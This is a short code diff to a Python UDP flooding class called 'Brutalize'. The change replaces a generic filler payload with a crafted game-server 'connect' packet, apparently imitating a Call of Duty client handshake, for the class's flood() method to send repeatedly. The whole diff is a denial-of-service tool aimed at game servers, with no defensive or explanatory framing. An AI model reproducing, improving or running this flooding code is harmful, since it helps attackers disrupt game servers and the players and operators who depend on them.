@@ -21,7 +21,7 @@ class Brutalize:
 
         self.client = socket(family=AF_INET, type=SOCK_DGRAM)
         # self.data = self._randbytes()
-        self.data = str.encode("x" * self.force)
+        self.data = str.encode('\xff\xff\xff\xffconnect "\cl_voice\1\rate\20000\name\packgodbible\natType\2\rank\2\lastdaysplayed\0\teamid\0\clanAbbrevEV\0\secondScreenClient\0\xPGroupMask\1\availableMapPackFlags\37114\contentAvailable\37114\emblem\******\protocol\2089\netfieldchk\1411153\sessionmode\1\challenge\1860\invited\1\xuid\1000000002d\steamid\001000\qport\-7357\migrating\0"')
         self.len = len(self.data)
 
     def flood(self):
